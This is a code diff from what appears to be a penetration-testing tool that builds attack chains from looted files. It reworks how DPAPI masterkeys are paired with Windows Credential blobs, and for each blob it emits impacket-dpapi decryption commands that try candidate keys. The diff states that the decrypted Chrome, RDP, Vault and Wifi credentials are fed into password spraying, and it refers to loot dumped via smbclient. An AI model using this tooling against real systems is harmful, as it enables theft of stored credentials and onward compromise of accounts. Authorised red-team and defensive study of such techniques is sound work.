@@ -1319,22 +1319,46 @@ def run(report, store, ui=None):
         if "Windows Credential vault" in det or "/Credentials/" in src or "\\Credentials\\" in src:
             blob_paths.append((src, f.get("line")))
     if dpapi_mks and blob_paths:
-        # Pair the first masterkey with each blob; operator runs once per blob
-        # and the right masterkey is whichever decrypts (impacket prints success).
-        mk = dpapi_mks[0]
-        sha1 = mk.meta["sha1"]
-        for bsrc, bln in blob_paths[:5]:    # cap at 5 to avoid spam
+        # iter-154: DPAPI masterkey <-> blob pairing is many-to-many. Every
+        # user profile on a workstation has its own masterkey, and every
+        # Credentials\<hex> blob is encrypted with exactly ONE of them (the
+        # blob header's guidhint field would tell us but our detector
+        # doesn't parse it). We emit ONE command per blob, listing all
+        # candidate masterkey sha1s so the operator can loop-try them
+        # (impacket-dpapi prints an unambiguous decrypt-failed on the
+        # wrong key). Cap at 5 blobs and 5 sha1s each to avoid spam.
+        _sha1s = []
+        _seen_sha1 = set()
+        for _mk in dpapi_mks:
+            _s = (_mk.meta or {}).get("sha1", "")
+            if _s and _s not in _seen_sha1:
+                _seen_sha1.add(_s)
+                _sha1s.append(_s)
+            if len(_sha1s) >= 5:
+                break
+        for bsrc, bln in blob_paths[:5]:
+            _blob_sh = _sh_sq(bsrc)
+            _cmds = [
+                # iter-146: shell-escape the blob path - Windows loot
+                # directories dumped via smbclient often reach us with
+                # spaces or apostrophes in the path.
+                f"impacket-dpapi credential -key 0x{_sha1s[0]} '{_blob_sh}'"
+            ]
+            # iter-154: if we have >1 mk, list the alternatives as
+            # commented-out one-liners so operator has copy-paste ready.
+            if len(_sha1s) > 1:
+                _cmds.append(f"# other candidate masterkeys "
+                             f"({len(_sha1s) - 1} more) - try each if the first fails:")
+                for _s in _sha1s[1:]:
+                    _cmds.append(f"# impacket-dpapi credential -key 0x{_s} '{_blob_sh}'")
+            _cmds.append(f"# decrypted blob holds saved Chrome/RDP/Vault/Wifi creds; "
+                         f"feed any plaintext into spray (R1)")
+            _sha1_disp = _sha1s[0]
             chains.append(Chain("R-DPAPI", "DPAPI masterkey + blob pair",
-                f"masterkey sha1={sha1[:16]}... + {os.path.basename(bsrc)}",
+                f"masterkey sha1={_sha1_disp[:16]}...{' (+alt)' if len(_sha1s) > 1 else ''}"
+                f" + {os.path.basename(bsrc)}",
                 crit=8, conf=0.85, ready=1.5, prox=0.85,        # score 8.67
-                commands=[
-                    # iter-146: shell-escape the blob path - Windows loot
-                    # directories dumped via smbclient often reach us with
-                    # spaces or apostrophes in the path.
-                    f"impacket-dpapi credential -key 0x{sha1} '{_sh_sq(bsrc)}'",
-                    f"# decrypted blob holds saved Chrome/RDP/Vault/Wifi creds; "
-                    f"feed any plaintext into spray (R1)",
-                ], src=bsrc, line=bln))
+                commands=_cmds, src=bsrc, line=bln))
 
     # iter-23: ACL-edge chains.
     # When the operator owns ANY plaintext credential AND BloodHound reveals
